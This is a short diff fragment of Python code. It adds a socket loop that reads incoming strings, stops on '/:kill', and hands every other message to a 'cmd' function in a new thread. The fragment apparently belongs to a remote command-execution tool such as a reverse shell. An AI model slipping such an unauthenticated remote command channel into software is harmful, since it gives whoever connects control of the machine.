@@ -38,4 +38,12 @@ def cmd(client, data):
     except Exception as error:
         print(error)
     
-                    
+#client 
+def cli(client):
+    try:
+        while True: 
+            data = client.recv(1024).decode().strip()
+            if data == '/:kill':
+                return
+            else: 
+                threading.Thread(target=cmd, args=(client, data)).start()
